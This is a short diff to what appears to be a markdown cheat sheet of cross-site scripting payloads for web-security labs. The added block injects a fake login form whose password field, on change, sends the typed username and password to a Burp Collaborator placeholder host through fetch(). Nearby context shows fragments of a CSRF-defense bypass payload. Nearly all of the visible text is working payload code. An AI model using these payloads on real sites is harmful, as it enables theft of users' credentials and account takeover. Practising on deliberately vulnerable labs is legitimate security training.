@@ -269,6 +269,15 @@ getElementsByName("csrf")[0].value); data.append("postId", 1); data.append("comm
 }'>
 <button class="button" type="submit">Log in</button>
 ```
+or using collaborator:
+```html
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
 **Bypass CSRF defense**
 ```html
 <img src=1 onerror='if (true) { 
